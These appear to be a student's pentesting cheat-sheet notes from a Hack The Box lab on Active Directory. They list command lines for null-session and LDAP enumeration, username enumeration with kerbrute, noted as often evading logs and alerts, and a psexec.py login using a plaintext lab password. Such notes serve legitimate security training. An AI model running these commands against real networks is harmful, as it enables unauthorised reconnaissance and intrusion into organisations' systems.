## Null session

### nxc

```sh
nxc smb 192.168.1.1 -u '' -p '' --users
```

### rpcclient

```sh
slomkm@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

# Optain password policy
rpcclient $> querydominfo
```

### enum4linux

```sh
slomkm@htb[/htb]$ enum4linux -P 172.16.5.5
```

### ldapsearch

```sh
slomkm@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

---
## Enumerating Users 

### Kerbrute
its a good choice, It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.

```sh
slomkm@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### crackmapexec
```sh
slomkm@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
```

### ldap
```sh
slomkm@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```


---

## Connecting

### psexec.py

it uses rpc.

```sh
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 
```